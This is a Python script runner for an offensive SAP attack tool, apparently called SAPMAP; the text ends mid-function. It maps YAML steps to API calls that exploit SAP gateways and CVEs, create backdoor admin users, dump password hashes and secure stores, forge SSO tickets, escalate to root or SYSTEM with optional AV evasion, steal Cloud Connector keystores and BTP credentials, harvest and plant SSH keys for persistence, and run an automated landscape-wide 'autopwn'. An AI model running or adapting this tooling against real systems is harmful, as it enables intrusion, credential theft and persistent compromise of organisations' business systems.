#!/usr/bin/env python3
"""
SAPMAP Script Runner — execute scripted attack scenarios via the API.

Reads a YAML (or JSON) script file and sequentially executes each step
against the running SAPMAP Bottle server. The GUI updates in real-time
as each step runs (nodes appear, exploits fire, connections are drawn).

Usage:
    python3 sapmap.py --script demo_scenario.yaml

Script format (YAML):
    steps:
      - action: add_system
        sid: S4H
        ip: 192.168.2.209
        instance: "00"
      - action: check_gw
        target: S4H
      - action: betrusted
        target: S4H
        attacker_ip: auto
      ...

Supported actions:
    # Core discovery / add
    add_system, set_credentials, scan, standard_scan, deep_scan,
    rfc_system_info, check_default_creds, check_snc, enum_clients,
    client_roles,
    # ABAP vuln checks + exploitation
    check_gw, check_ms, check_cve_6287, betrusted, betrusted_chain,
    create_user, create_user_via_rfc, retrieve_rfcs, test_rfcs,
    test_rfc_single, download_hashes, download_secstore, download_table,
    import_transport, create_tcpip_dest, cleanup, cleanup_all,
    # ICMAD (CVE-2022-22536)
    check_cve_22536, icmad_acl_bypass, icmad_heapdump_pull,
    # Java vuln checks + data extraction
    check_cve_31324, java_secstore, extract_java_hashes,
    read_java_destinations, download_java_table, impact_assess_java,
    # Java exploitation (--confirm)
    exploit_cve_31324, create_user_java,
    # OS execution
    exec_command, sapcontrol_osexecute,
    # Linux + Windows LPE
    check_linux_lpe, exploit_linux_lpe, check_windows_lpe,
    exploit_windows_lpe, lpe,
    # Web Dispatcher / ICM admin
    wd_rediscover, wd_admin_set_credentials, wd_admin_probe_defaults,
    wd_extract_icmauth,
    # MYSAPSSO2 ticket forgery
    forge_ticket, propagate_ticket, forge_and_fanout,
    discover_strustsso2,
    # SSH lateral movement
    ssh_harvest, ssh_test_keys, ssh_plant_key,
    # Business impact + trust chain analysis
    impact_assess, impact_show, impact_export, analyze_chains,
    highlight_chain, layout, sleep, verify_pp_impersonation,
    read_usrextid, read_oa2c, analyse_capabilities,
    # Node identity / metadata overrides
    set_sid, set_instance_nr, set_type, set_db_type, set_os_type,
    set_telnet_override,
    # SAProuter
    set_saprouter, check_router_info, router_scan,
    # SAP Cloud Connector
    scc_set_credentials, scc_probe_creds, scc_pull_mappings,
    scc_probe_mappings, scc_extract_keystore, scc_download_hashes,
    scc_lookup_hashes, scc_decrypt_ssfs, harvest_scc,
    harvest_scc_mappings, harvest_scc_ssfs,
    harvest_scc_hashes_via_lpe,
    # BTP — cloud-side enumeration with a stored token
    btp_set_token, btp_enumerate, btp_pull_destinations_for_token,
    btp_test_destination, btp_create_user_on_target,
    # BTP — on-prem → cloud lateral pivot
    harvest_btp_creds, mint_btp_token,
    # Landscape-wide sweeps + AutoPwn
    autopwn, propagate, propagate_all,
    check_all_gw, check_all_ms, check_all_betrusted, check_all_cve_31324,
    check_all_cve_6287, check_all_cve_22536, check_all_router_info,
    check_all_snc, check_all_vulns,
    # State management
    save_state, load_state,
    # Tier 3 evasion (--allow-evasion + --confirm required)
    tier3_arm_death_star, tier3_disarm_death_star,
    # Kernel-proxied cert-auth exploitation (X.509 Type G destinations)
    cert_dest_probe,
    # Macros (expanded at load time into multiple sub-steps)
    java_pipeline
"""

import json
import logging
import os
import socket
import time
import urllib.request
import urllib.error

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Step → API endpoint mapping
# ---------------------------------------------------------------------------

def _local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def _map_step(step: dict) -> tuple:
    """Map a script step to (method, path, payload).

    Returns (http_method, api_path, json_payload, wait_for_completion).
    """
    action = step.get("action", "").strip().lower()
    target = step.get("target", "").strip()

    if action == "add_system":
        return ("POST", "/api/node/add", {
            "sid": step.get("sid", ""),
            "ip": step.get("ip", ""),
            "instance_nr": str(step.get("instance", "00")),
            "saprouter": step.get("saprouter", ""),
        }, True)

    if action == "set_credentials":
        return ("POST", f"/api/node/{target}/credentials", {
            "username": step.get("username", ""),
            "password": step.get("password", ""),
            "client": str(step.get("client", "001")),
        }, False)

    if action == "check_gw":
        return ("POST", f"/api/node/{target}/check_gw", {}, True)

    if action == "check_ms":
        return ("POST", f"/api/node/{target}/check_ms", {}, True)

    if action == "betrusted":
        ip = step.get("attacker_ip", "auto")
        if ip == "auto":
            ip = _local_ip()
        return ("POST", f"/api/node/{target}/betrusted", {
            "attacker_ip": ip,
            "nilist_wait": step.get("nilist_wait", 30),
        }, True)

    if action == "betrusted_chain":
        ip = step.get("attacker_ip", "auto")
        if ip == "auto":
            ip = _local_ip()
        return ("POST", f"/api/node/{target}/betrusted_chain", {
            "attacker_ip": ip,
            "nilist_wait": step.get("nilist_wait", 30),
            "client": str(step.get("client", "001")),
        }, True)

    if action == "create_user":
        return ("POST", f"/api/node/{target}/create_user", {
            "method": step.get("method", "gw_exploit"),
            "client": str(step.get("client", "001")),
        }, True)

    if action == "retrieve_rfcs":
        # ``auto_probe_cert_auth`` (default True) fires the kernel-
        # proxy primitive against every X.509 destination discovered
        # in the same run.  Playbooks that only want the raw RFCDES
        # rows can pass ``auto_probe_cert_auth: false``.
        return ("POST", f"/api/node/{target}/retrieve_rfcs", {
            "auto_probe_cert_auth": step.get(
                "auto_probe_cert_auth", True),
        }, True)

    if action == "test_rfcs":
        return ("POST", f"/api/node/{target}/test_rfcs", {}, True)

    if action == "download_hashes":
        return ("POST", f"/api/node/{target}/download_hashes", {}, True)

    if action == "download_secstore":
        return ("POST", f"/api/node/{target}/download_secstore", {}, True)

    if action == "impact_assess":
        payload = {}
        if step.get("client"):
            payload["client"] = str(step["client"])
        if step.get("scenario"):
            payload["scenario"] = step["scenario"]
        return ("POST", f"/api/node/{target}/impact/assess", payload, True)

    if action == "analyze_chains":
        return ("POST", "/api/actions/analyze_chains", {}, True)

    if action == "highlight_chain":
        return ("HIGHLIGHT_CHAIN", "", {
            "start": step.get("start", ""),
            "end": step.get("end", ""),
            "index": step.get("index", 0),
        }, False)

    if action == "layout":
        mode = (step.get("mode") or "").strip().lower()
        valid = {"circle", "star", "hierarchy", "stack", "by_stack", "reset"}
        if mode not in valid:
            raise ValueError(
                f"layout requires mode in {sorted(valid)} (got {mode!r})"
            )
        return ("LAYOUT", "", {"mode": mode}, False)

    if action == "check_all_gw":
        return ("POST", "/api/actions/check_all_gw", {}, True)

    if action == "check_all_betrusted":
        ip = step.get("attacker_ip", "auto")
        if ip == "auto":
            ip = _local_ip()
        return ("POST", "/api/actions/check_all_betrusted", {
            "attacker_ip": ip,
        }, True)

    if action == "propagate":
        return ("POST", f"/api/node/{target}/propagate", {}, True)

    if action == "deep_scan":
        return ("POST", f"/api/node/{target}/deep_scan", {}, True)

    if action == "lpe":
        return ("POST", f"/api/node/{target}/lpe", {
            "method": step.get("method"),
        }, True)

    if action == "test_rfc_single":
        return ("POST", f"/api/node/{target}/test_rfc_single", {
            "destination_name": step.get("destination", ""),
        }, True)

    if action == "create_user_via_rfc":
        return ("POST", f"/api/node/{target}/create_user_via_rfc", {
            "destination_name": step.get("destination", ""),
            "target_sid": step.get("target_sid", ""),
        }, True)

    if action == "scan":
        return ("POST", "/api/scan/start", {
            "targets": step.get("targets", ""),
            "scan_mode": step.get("mode", "fast"),
            "concurrent_hosts": step.get("concurrent_hosts", 5),
        }, True)

    if action == "impact_show":
        return ("IMPACT_SHOW", "", target, False)

    if action == "impact_export":
        scenario = step.get("scenario", "")
        return ("IMPACT_EXPORT", "", {"target": target, "scenario": scenario}, False)

    if action == "sleep":
        return ("SLEEP", "", step.get("seconds", 5), False)

    if action == "check_cve_31324":
        return ("POST", f"/api/node/{target}/check_cve_2025_31324",
                {}, True)

    if action == "check_cve_6287":
        return ("POST", f"/api/node/{target}/check_cve_2020_6287",
                {}, True)

    if action == "check_all_cve_31324":
        return ("POST", "/api/actions/check_all_cve_31324", {}, True)

    if action == "java_secstore":
        return ("POST", f"/api/node/{target}/java_secstore", {}, True)

    if action == "extract_java_hashes":
        return ("POST", f"/api/node/{target}/extract_java_hashes", {}, True)

    if action == "read_java_destinations":
        return ("POST", f"/api/node/{target}/read_java_destinations",
                {}, True)

    if action == "download_java_table":
        table = (step.get("table") or "").strip()
        if not table:
            raise ValueError("download_java_table requires `table`")
        payload = {
            "table":  table,
            "fields": step.get("fields", "*"),
            "where":  step.get("where", ""),
        }
        if step.get("max_rows"):
            payload["max_rows"] = int(step["max_rows"])
        return ("POST", f"/api/node/{target}/download_java_table",
                payload, True)

    if action == "impact_assess_java":
        return ("POST", f"/api/node/{target}/impact_assess_java",
                {}, True)

    if action == "exploit_cve_31324":
        mode = (step.get("mode") or "command").strip().lower()
        payload = {"mode": mode}
        if mode == "command":
            cmd = (step.get("command") or "").strip()
            if not cmd:
                raise ValueError("exploit_cve_31324 mode=command requires "
                                 "`command`")
            payload["command"] = cmd
        return ("POST", f"/api/node/{target}/exploit_cve_2025_31324",
                payload, True)

    if action == "create_user_java":
        password = (step.get("password") or "").strip()
        if not password:
            raise ValueError("create_user_java requires `password`")
        payload = {
            "username": (step.get("username") or "SAPMAP00").strip(),
            "password": password,
            "group":    (step.get("group") or "Administrators").strip(),
            "method":   (step.get("method") or "auto").strip(),
        }
        return ("POST", f"/api/node/{target}/create_user_java",
                payload, True)

    # -----------------------------------------------------------------
    # SAProuter actions
    # -----------------------------------------------------------------
    if action == "set_saprouter":
        # Attach a router prefix to a node so subsequent ops tunnel through it.
        # Usage:  - action: set_saprouter
        #           target: S4H
        #           saprouter: "/H/192.168.2.209/S/3299"
        return ("POST", f"/api/node/{target}/set_saprouter", {
            "saprouter": (step.get("saprouter") or "").strip(),
        }, False)

    if action == "set_sid":
        # Rename a node's SID (rewires every reference — connections,
        # created users, forged tickets, secstore entries, etc.).  Most
        # common use in scripts: replace a placeholder SID (RFCDISC_,
        # BTPDISC_, hostname-derived guess like "NCM") with the real
        # three-char SID once the operator knows it.
        # Usage:  - action: set_sid
        #           target: RFCDISC_10_10_1_12
        #           new_sid: SJ1
        new_sid = (step.get("new_sid") or step.get("sid")
                    or "").strip().upper()
        if not (len(new_sid) == 3 and new_sid.isalnum()):
            raise ValueError(
                f"set_sid: new_sid must be 3 alphanumeric chars "
                f"(got {new_sid!r})")
        return ("POST", f"/api/node/{target}/set_sid", {
            "new_sid": new_sid,
        }, False)

    if action == "set_instance_nr":
        # Set (or override) a node's two-digit SAP instance number.
        # Backfills the conventional per-instance ports (32NN dispatcher,
        # 33NN gateway, 36NN MS, 80NN ICM) so GW / RFC / MS actions
        # unlock without a full port scan.
        # Usage:  - action: set_instance_nr
        #           target: S4H
        #           instance_nr: "00"
        inst = (step.get("instance_nr")
                or step.get("instance") or "").strip()
        if not (len(inst) == 2 and inst.isdigit()):
            raise ValueError(
                f"set_instance_nr: instance_nr must be two digits "
                f"(got {inst!r})")
        return ("POST", f"/api/node/{target}/set_instance_nr", {
            "instance_nr": inst,
        }, False)

    if action == "check_router_info":
        # CVE-2017-12636 / ROUTER_ADM info leak probe on a SAProuter node.
        return ("POST", f"/api/node/{target}/check_router_info", {}, True)

    if action == "router_scan":
        # Scan internal hosts through a SAProuter node.
        #   target:       SID of the SAProuter node
        #   targets:      "192.168.2.0/24" or "192.168.2.10-20" or ""
        #                 (empty ⇒ auto-extract from prior router_info probe)
        #   auto_targets: bool (defaults True when targets is empty)
        #   inst_from/to: SAP instance-number range (default 0..10)
        #   mode:         "sap" (default) or "full" (adds HANA + JAVA)
        #   concurrency:  parallel probes (default 10)
        #   timeout:      per-probe socket timeout (default 5s)
        payload = {
            "targets":     (step.get("targets") or "").strip(),
            "inst_from":   int(step.get("inst_from", 0)),
            "inst_to":     int(step.get("inst_to", 10)),
            "mode":        (step.get("mode") or "sap").strip(),
            "concurrency": int(step.get("concurrency", 10)),
            "timeout":     float(step.get("timeout", 5.0)),
        }
        if "auto_targets" in step:
            payload["auto_targets"] = bool(step["auto_targets"])
        return ("POST", f"/api/node/{target}/router_scan", payload, True)

    # ── SAP Cloud Connector actions ─────────────────────────────────────
    # All scc_* actions use target as the SCC host (IP or hostname).
    # All node_scc_* actions use target as the SAP node SID.

    if action == "scc_set_credentials":
        # Store SCC admin credentials for future pulls.
        #   target:   SCC host (e.g. "192.168.2.167")
        #   username: SCC admin username (default "Administrator")
        #   password: SCC admin password
        return ("POST", f"/api/scc/{target}/set_credentials", {
            "username": step.get("username", "Administrator"),
            "password": step.get("password", ""),
        }, False)

    if action == "scc_probe_creds":
        # Probe SCC default credentials (Administrator/manage).
        #   target: SCC host
        return ("POST", f"/api/scc/{target}/probe_creds", {}, True)

    if action == "scc_pull_mappings":
        # Pull cloud→on-prem mappings via SCC admin REST API.
        #   target:   SCC host
        #   username: SCC admin username
        #   password: SCC admin password
        return ("POST", f"/api/scc/{target}/pull_mappings", {
            "username": step.get("username", "Administrator"),
            "password": step.get("password", ""),
        }, True)

    if action == "scc_probe_mappings":
        # TCP/HTTP smoke-test every SCC mapping to check backend reachability.
        #   target: SCC host
        return ("POST", f"/api/scc/{target}/probe_mappings", {}, True)

    if action == "scc_extract_keystore":
        # Pull full SCC backup zip, extract keystores, decrypt SSFS.
        # This is the crown-jewels action — add to DESTRUCTIVE_ACTIONS.
        #   target:          SCC host
        #   username:        SCC admin username
        #   password:        SCC admin password
        #   backup_password: zip encryption password (defaults to password)
        return ("POST", f"/api/scc/{target}/extract_keystore", {
            "username":        step.get("username", "Administrator"),
            "password":        step.get("password", ""),
            "backup_password": step.get("backup_password",
                                        step.get("password", "")),
        }, True)

    if action == "scc_download_hashes":
        # Download SCC password hashes (users.xml) via OS-exec / zip / REST.
        #   target: SCC host
        return ("POST", f"/api/scc/{target}/download_user_hashes", {}, True)

    if action == "scc_lookup_hashes":
        # Look up SCC hashes against hashes.com rainbow tables.
        # api_key is optional — falls back to settings.local.json.
        #   target:  SCC host
        #   api_key: hashes.com API key (optional)
        #   hashes:  list of {username, hash_hex, algorithm} (optional;
        #            if omitted the route reads from the SCC node state)
        payload = {}
        if step.get("api_key"):
            payload["api_key"] = step["api_key"]
        if step.get("hashes"):
            payload["hashes"] = step["hashes"]
        return ("POST", f"/api/scc/{target}/lookup_hashes_online",
                payload, True)

    if action == "scc_decrypt_ssfs":
        # Decrypt SSFS_SCC blob from a previously extracted backup zip.
        #   target: SCC host
        return ("POST", f"/api/scc/{target}/decrypt_ssfs", {}, True)

    if action == "harvest_scc":
        # Post-RCE SCC harvest from a pwned SAP node (ARP sweep, keystore
        # bundle exfil, etc.).  Requires OS-exec on the target SAP node.
        #   target: SAP node SID (not SCC host)
        return ("POST", f"/api/node/{target}/harvest_scc", {}, True)

    if action == "harvest_scc_mappings":
        # Read SCC backends.xml directly via OS-exec on co-located SAP node.
        #   target: SAP node SID
        return ("POST", f"/api/node/{target}/harvest_scc_mappings", {}, True)

    if action == "harvest_scc_ssfs":
        # Read on-host SSFS_SCC.KEY/.DAT via OS-exec, decrypt secrets.
        #   target: SAP node SID (node co-located with SCC)
        return ("POST", f"/api/node/{target}/harvest_scc_ssfs", {}, True)

    if action in ("check_linux_lpe", "check_copyfail"):
        # Probe Linux root LPE viability (Copy Fail + Dirty Frag).
        # ``check_copyfail`` is the legacy alias kept for older scripts.
        #   target: SAP node SID (must have OS-exec path, Linux only)
        return ("POST", f"/api/node/{target}/check_linux_lpe", {}, True)

    if action in ("exploit_linux_lpe", "exploit_copyfail"):
        # Execute a shell command as root using the best-available
        # Linux LPE technique (Copy Fail when viable, otherwise Dirty
        # Frag).  ``exploit_copyfail`` is the legacy alias kept for
        # older scripts.
        #   target:  SAP node SID
        #   command: shell command to run as root (default: "id")
        return ("POST", f"/api/node/{target}/exploit_linux_lpe", {
            "command": step.get("command", "id"),
        }, True)

    # --- BTP (cloud) actions ----------------------------------------------
    # Two directions:
    #   * cloud → on-prem: paste a BTP token, enumerate the cloud
    #     topology, capture cleartext destinations on the bound
    #     subaccount, walk down to ABAP/Java targets.
    #   * on-prem → cloud (reverse pivot): mine a pwned ABAP system's
    #     stored creds (SM59 destinations / OA2C OAuth client config /
    #     RSECTAB / Java SecStoreFS), exchange them at XSUAA for a BTP
    #     token, then run the cloud-side enumeration on top.

    if action == "btp_set_token":
        # Store a BTP access token in process memory for later
        # enumerate / pull-destinations calls.
        #   region: BTP region (eu10 / eu10-004 / us10 / …); when
        #           omitted the runner extracts it from the token's
        #           iss claim server-side.
        #   token:  the JWT access token (or path:<file> to read it
        #           from disk so secrets don't show up in script YAML)
        return ("POST", "/api/btp/set_token", {
            "region": step.get("region", ""),
            "token": _read_token(step.get("token", "")),
        }, True)

    if action == "btp_enumerate":
        # Kind-aware enumeration over a stored BTP token: for cf
        # tokens this surfaces orgs / spaces / apps / service
        # instances + escalation hints; for subaccount-admin tokens
        # it walks every subaccount + SCC mapping; for destination-
        # service tokens it surfaces the bound subaccount and the
        # operator runs btp_pull_destinations_for_token next.
        #   region: which stored token to use
        return ("POST", "/api/btp/enumerate", {
            "region": step.get("region", ""),
        }, True)

    if action == "btp_pull_destinations_for_token":
        # For a destination-service-scoped token, pull every
        # destination on the bound subaccount and link cleartext
        # creds to on-prem SAPNodes.  Auto-fires Standard Scan on
        # any newly-materialised BTPDISC_* placeholder.
        #   region: which stored token to use
        return ("POST", "/api/btp/pull_destinations_for_token", {
            "region": step.get("region", ""),
        }, True)

    if action == "btp_test_destination":
        # Test a synthetic BTP→on-prem edge with the captured
        # cleartext credential.  HTTP basic-auth probe + (when the
        # target is ABAP) a direct RFC profile fetch incl. SAP_ALL.
        #   source_sid:       BTP:<uuid8> sentinel from the linker
        #   destination_name: synthetic BTP:<uuid8>::<dest_name>
        return ("POST", "/api/btp/test_destination", {
            "source_sid": step.get("source_sid", ""),
            "destination_name": step.get("destination_name", ""),
        }, True)

    if action == "btp_create_user_on_target":
        # After a successful btp_test_destination flips logon_successful
        # AND has_sap_all, mint a SAPMAP user on the target ABAP via
        # the captured creds (BTP→on-prem lateral move).
        #   source_sid:       BTP:<uuid8>
        #   destination_name: synthetic BTP:<uuid8>::<dest_name>
        #   target_sid:       linked on-prem SID
        return ("POST", "/api/btp/create_user_on_target", {
            "source_sid": step.get("source_sid", ""),
            "destination_name": step.get("destination_name", ""),
            "target_sid": step.get("target_sid", ""),
        }, True)

    if action == "harvest_btp_creds":
        # On-prem → BTP harvest.  Refreshes node.oauth2_profiles
        # via OA2C_CLIENT[+_EXT] then scans the four sources for
        # BTP-shaped (client_id, client_secret, uaa_url) tuples.
        # Returns the candidate list in `result.candidates` (use
        # `capture: NAME` to bind it to a script variable so the
        # next step can mint with it).
        #   target: SAP node SID (must be ABAP for OA2C refresh)
        return ("POST", f"/api/node/{target}/harvest_btp_creds",
                {}, True)

    # -----------------------------------------------------------------
    # AutoPwn — full-landscape convergence loop
    # -----------------------------------------------------------------
    if action == "autopwn":
        # Launch the AutoPwn scan → exploit → enrich → propagate loop.
        # All knobs optional; defaults mirror the GUI's launcher.
        #   max_waves:        int  (default 5)
        #   include_lpe:      bool (default False)
        #   include_btp:      bool (default True)
        #   scan_gw:          bool (default True)
        #   scan_10kblaze:    bool (default False — slow multi-hop)
        #   scan_cve_31324:   bool (default True)
        #   scan_recon:       bool (default True)
        #   include_icmad_detection:       bool (default True)
        #   include_router_info_detection: bool (default True)
        return ("POST", "/api/actions/autopwn", {
            "max_waves": int(step.get("max_waves", 5)),
            "include_lpe": bool(step.get("include_lpe", False)),
            "include_btp": bool(step.get("include_btp", True)),
            "scan_gw": bool(step.get("scan_gw", True)),
            "scan_10kblaze": bool(step.get("scan_10kblaze", False)),
            "scan_cve_31324": bool(step.get("scan_cve_31324", True)),
            "scan_recon": bool(step.get("scan_recon", True)),
            "include_icmad_detection": bool(
                step.get("include_icmad_detection", True)),
            "include_router_info_detection": bool(
                step.get("include_router_info_detection", True)),
        }, True)

    # -----------------------------------------------------------------
    # Node identity / metadata overrides
    # -----------------------------------------------------------------
    if action == "set_type":
        # Force node.system_type (e.g. "ABAP" / "JAVA" / "ABAP+JAVA"
        # / "WEB_DISPATCHER").  set_type=WEB_DISPATCHER also flips
        # node.is_web_dispatcher on for ICMAD severity + menu gating.
        return ("POST", f"/api/node/{target}/set_type", {
            "system_type": (step.get("system_type") or "").strip(),
        }, False)

    if action == "set_db_type":
        # Set node.db_type — used by GW SAPXPG SQL writer chain and
        # SecStore.  Codes: HDB, ADA, MSS, ORA, DB6.
        return ("POST", f"/api/node/{target}/set_db_type", {
            "db_type": (step.get("db_type") or "").strip(),
        }, False)

    if action == "set_os_type":
        # Force node.os_type — controls shell wrapping in every
        # OS-exec path.  Values like "Linux", "Windows NT", "AIX".
        return ("POST", f"/api/node/{target}/set_os_type", {
            "os_type": (step.get("os_type") or "").strip(),
        }, False)

    if action == "set_telnet_override":
        # Override the AS Java admin telnet host:port (5NN08) with a
        # tunnel endpoint.  Empty string clears the override.
        return ("POST", f"/api/node/{target}/set_telnet_override", {
            "telnet_override": (step.get("telnet_override") or "").strip(),
        }, False)

    # -----------------------------------------------------------------
    # Scan / discovery
    # -----------------------------------------------------------------
    if action == "standard_scan":
        # Standard-depth port + service scan on an existing node.
        # Lighter than deep_scan (no CVE probes) but populates
        # dispatcher / gateway / MS / ICM ports.
        return ("POST", f"/api/node/{target}/standard_scan", {}, True)

    if action == "rfc_system_info":
        # Unauthenticated SID probe on discovered ports.  Fills
        # node.sid / node.system_type when successful.
        return ("POST", f"/api/node/{target}/rfc_system_info", {}, True)

    if action == "check_default_creds":
        # Sequential DIAG probe of the 16 vendor-default credentials
        # (SAP*, DDIC, EARLYWATCH, TMSADM, …) across each known client.
        # Sequential by design to minimise lockout risk.
        return ("POST", f"/api/node/{target}/check_default_creds", {}, True)

    if action == "check_snc":
        # Read snc/enable + snc/data_protection/* profile params.
        return ("POST", f"/api/node/{target}/check_snc", {}, True)

    if action == "enum_clients":
        # DIAG-based enumeration of visible SAP clients on the node.
        return ("POST", f"/api/node/{target}/enum_clients", {}, True)

    if action == "client_roles":
        # Read T000 client roles table.
        return ("POST", f"/api/node/{target}/client_roles", {}, True)

    if action == "check_cve_22536":
        # ICMAD (CVE-2022-22536) — patch-table lookup + live smuggle
        # probe on every discovered ICM port.
        return ("POST", f"/api/node/{target}/check_cve_2022_22536", {},
                True)

    if action == "icmad_acl_bypass":
        # D.2 — sweep 12 hand-picked admin/recon paths through the
        # ICMAD smuggle bypass.  Requires check_cve_22536 first.
        return ("POST", f"/api/node/{target}/icmad_acl_bypass", {
            "outer_path": step.get("outer_path", "/sap/wzip?aaa"),
        }, True)

    if action == "icmad_heapdump_pull":
        # D.3 — list available heap dumps (no `dump` field) or pull
        # a specific dump via the ICMAD smuggle bypass.
        payload = {"outer_path": step.get("outer_path", "/sap/wzip?aaa")}
        if step.get("dump"):
            payload["dump"] = step["dump"]
        return ("POST", f"/api/node/{target}/icmad_heapdump_pull",
                payload, True)

    # -----------------------------------------------------------------
    # ICM / Web Dispatcher
    # -----------------------------------------------------------------
    if action == "wd_rediscover":
        # Rescan a Web Dispatcher / ICM node for admin ports and
        # backend routes.
        return ("POST", f"/api/node/{target}/wd_rediscover", {}, True)

    if action == "wd_admin_set_credentials":
        # Store admin credentials for the ICM/WD admin UI.
        return ("POST", f"/api/node/{target}/wd_admin_set_credentials", {
            "username": step.get("username", ""),
            "password": step.get("password", ""),
        }, False)

    if action == "wd_admin_probe_defaults":
        # Probe default credentials against the ICM/WD admin UI.
        return ("POST", f"/api/node/{target}/wd_admin_probe_defaults",
                {}, True)

    if action == "wd_extract_icmauth":
        # Pull icmauth.txt (hashed webadmin credentials) via admin API.
        return ("POST", f"/api/node/{target}/wd_extract_icmauth", {},
                True)

    # -----------------------------------------------------------------
    # Windows LPE
    # -----------------------------------------------------------------
    if action == "check_windows_lpe":
        # Probe EfsPotato / GodPotato / MiniPlasma viability.
        return ("POST", f"/api/node/{target}/check_windows_lpe", {}, True)

    if action == "exploit_windows_lpe":
        # Run a shell command as NT AUTHORITY\SYSTEM via the best
        # viable Windows LPE.  DESTRUCTIVE.
        return ("POST", f"/api/node/{target}/exploit_windows_lpe", {
            "command": step.get("command", "whoami"),
            "av_evasion": bool(step.get("av_evasion", False)),
        }, True)

    # -----------------------------------------------------------------
    # MYSAPSSO2 ticket forgery + propagation
    # -----------------------------------------------------------------
    if action == "forge_ticket":
        # Forge a MYSAPSSO2 ticket impersonating an arbitrary user,
        # signed by the target's SAPSYS.pse.  DESTRUCTIVE — writes to
        # loot and (via propagate_ticket) enables SAP_ALL sessions
        # against every STRUSTSSO2-trusted receiver.
        payload = {
            "user": step.get("user", "SAP*"),
            "client": str(step.get("client", "100")),
            "validity_min": int(step.get("validity_min", 120)),
            "digest": step.get("digest", "sha256"),
        }
        if step.get("pin"):
            payload["pin"] = step["pin"]
        if step.get("recipient_sid"):
            payload["recipient_sid"] = step["recipient_sid"]
        if step.get("recipient_client"):
            payload["recipient_client"] = step["recipient_client"]
        return ("POST", f"/api/node/{target}/forge_ticket", payload,
                True)

    if action == "propagate_ticket":
        # Replay a forged ticket against one or more receivers.
        payload = {
            "ticket_index": int(step.get("ticket_index", 0)),
            "timeout": int(step.get("timeout", 10)),
        }
        if step.get("target_sids"):
            payload["target_sids"] = step["target_sids"]
        if step.get("channels"):
            payload["channels"] = step["channels"]
        return ("POST", f"/api/node/{target}/propagate_ticket", payload,
                True)

    if action == "forge_and_fanout":
        # Forge a ticket then auto-replay it against every trusted
        # receiver in state.trust_relations.  DESTRUCTIVE.
        payload = {
            "user": step.get("user", "SAP*"),
            "client": str(step.get("client", "100")),
            "validity_min": int(step.get("validity_min", 120)),
            "digest": step.get("digest", "sha1"),
            "timeout": int(step.get("timeout", 10)),
        }
        if step.get("recipient_sid"):
            payload["recipient_sid"] = step["recipient_sid"]
        if step.get("recipient_client"):
            payload["recipient_client"] = step["recipient_client"]
        if step.get("channels"):
            payload["channels"] = step["channels"]
        return ("POST", f"/api/node/{target}/forge_and_fanout", payload,
                True)

    if action == "discover_strustsso2":
        # Discover STRUSTSSO2 trust relationships on a pwned ABAP
        # node.  Populates state.trust_relations so forge_and_fanout
        # knows which receivers to hit.
        return ("POST", f"/api/node/{target}/discover_strustsso2", {},
                True)

    # -----------------------------------------------------------------
    # Table / transport / user extras
    # -----------------------------------------------------------------
    if action == "read_usrextid":
        # Read on-prem USREXTID (cert-CN → ABAP user mappings).
        return ("POST", f"/api/node/{target}/read_usrextid", {}, True)

    if action == "read_oa2c":
        # Read OA2C_CLIENT + OA2C_CLIENT_EXT — OAuth2 profiles for
        # BTP token minting.
        return ("POST", f"/api/node/{target}/read_oa2c", {}, True)

    if action == "verify_pp_impersonation":
        # After SCC PP analysis + USREXTID read, verify the SCC's
        # subject-pattern rule actually opens a session as the
        # impersonation-target ABAP user.
        return ("POST", f"/api/node/{target}/verify_pp_impersonation",
                {}, True)

    if action == "download_table":
        # Generic RFC_READ_TABLE download.  Fields defaults to * ,
        # max_rows caps result size.
        return ("POST", f"/api/node/{target}/download_table", {
            "table": (step.get("table") or "").strip(),
            "fields": step.get("fields", []),
            "where": (step.get("where") or "").strip(),
            "max_rows": int(step.get("max_rows", 500)),
        }, True)

    if action == "import_transport":
        # STMS transport import.  DESTRUCTIVE (dry_run=False installs
        # code on the target).  Note: zip payload must be handed to a
        # multipart upload; scripts can only trigger a dry-run over
        # an already-uploaded transport.  For full uploads use the
        # GUI's Import Transport menu.
        return ("POST", f"/api/node/{target}/import_transport", {
            "target_client": str(step.get("target_client", "001")),
            "dry_run": "1" if step.get("dry_run", True) else "0",
            "channel": step.get("channel", "auto"),
        }, True)

    if action == "create_tcpip_dest":
        # Create a TCP/IP RFC destination on a pwned ABAP node.  Used
        # to seed a Type-T destination that later SXPG calls will
        # bounce through.
        return ("POST", f"/api/node/{target}/create_tcpip_dest", {
            "destination": step.get("destination", ""),
            "host": step.get("host", ""),
            "program": step.get("program", ""),
        }, True)

    # -----------------------------------------------------------------
    # OS execution — direct + SAPControl OSExecute channel
    # -----------------------------------------------------------------
    if action == "exec_command":
        # Run a shell command via one of the three OS-exec channels:
        #   method=gateway    — GW SAPXPG (needs gw_vulnerable)
        #   method=sxpg       — authenticated SXPG (needs creds)
        #   method=cve_31324  — CVE-2025-31324 JSP webshell
        #   method=sapcontrol — SAPControl OSExecute pivot (Type-G).
        #                       Requires cached pivot on target.
        # cmdline auto-wraps in the target OS's shell.
        return ("POST", f"/api/node/{target}/exec_command", {
            "method": step.get("method", "gateway"),
            "cmdline": step.get("cmdline", ""),
            "command": step.get("command", ""),
            "params": step.get("params", ""),
        }, True)

    if action == "sapcontrol_osexecute":
        # Run a shell command via SAPControl OSExecute directly, using
        # a specified Type-G destination.  Synchronous — the SOAP
        # call blocks until the child exits.  Requires the connection
        # to be os_exec_verified (run test_rfc_single first).
        return ("POST", f"/api/node/{target}/sapcontrol_osexecute", {
            "destination_name": step.get("destination_name",
                                          step.get("destination", "")),
            "command": step.get("command", ""),
            "timeout": int(step.get("timeout", 30)),
        }, True)

    # -----------------------------------------------------------------
    # SSH lateral movement
    # -----------------------------------------------------------------
    if action == "ssh_harvest":
        # Phase 1 — enumerate OS users, exfiltrate SSH keys, parse
        # known_hosts + authorized_keys + config.
        return ("POST", f"/api/node/{target}/ssh_harvest", {
            "channel": step.get("channel", "auto"),
        }, True)

    if action == "ssh_test_keys":
        # Phase 2 — test harvested SSH keys against known targets.
        payload = {"channel": step.get("channel", "auto")}
        if step.get("keys"):
            payload["keys"] = step["keys"]
        if step.get("os_users"):
            payload["os_users"] = step["os_users"]
        return ("POST", f"/api/node/{target}/ssh_test_keys", payload,
                True)

    if action == "ssh_plant_key":
        # Phase 3 — plant SAPMAP SSH pubkey for persistence.
        # DESTRUCTIVE (writes authorized_keys).
